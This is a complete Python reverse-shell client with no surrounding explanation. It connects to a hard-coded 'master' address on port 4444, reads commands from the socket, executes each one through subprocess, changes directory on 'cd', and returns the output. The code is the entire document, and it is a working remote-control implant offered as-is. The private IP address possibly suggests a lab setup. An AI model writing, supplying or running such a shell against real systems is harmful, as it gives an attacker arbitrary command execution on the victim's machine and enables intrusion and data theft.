import socket
import subprocess
import os

# Connect back to your (master) machine
server_ip = '192.168.56.1'  # or LAN IP if local
server_port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server_ip, server_port))

while True:
    # Receive a command
    command = s.recv(1024).decode('utf-8')
    if command.lower() == "exit":
        break
    if command.startswith("cd "):
        os.chdir(command[3:])
    else:
        output = subprocess.getoutput(command)
        s.send(output.encode('utf-8'))

s.close()
